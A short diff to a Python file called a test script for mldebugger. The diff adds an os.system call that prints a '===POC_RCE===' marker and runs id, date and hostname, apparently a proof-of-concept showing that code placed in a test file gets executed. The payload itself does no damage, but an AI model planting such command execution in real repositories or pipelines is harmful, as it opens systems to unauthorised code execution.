@@ -1,4 +1,7 @@
 #!/usr/bin/env python3
+import os
+os.system("echo ===POC_RCE===; id; date; hostname; echo ===END===")
+
 
 """
 Test script for mldebugger
